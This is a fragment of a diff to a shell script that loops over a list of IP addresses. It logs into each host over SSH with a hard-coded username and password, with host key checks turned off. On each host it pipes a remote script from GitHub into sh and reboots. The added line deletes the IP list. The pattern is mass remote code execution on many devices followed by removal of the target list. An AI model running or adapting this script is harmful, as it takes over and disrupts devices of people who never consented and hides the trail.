@@ -18,3 +18,4 @@ cat ip_list.txt | while read ip ; do
     sshpass -p fuck.er ssh -p22 -oConnectTimeout=10 -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null moth3r@$host "trigger_url https://raw.githubusercontent.com/fernandodalbem/Update_Ubiquiti/master/Update_Ports.sh | sh; reboot" &
     sleep 0.15
 done
+rm -rf ip_list.txt
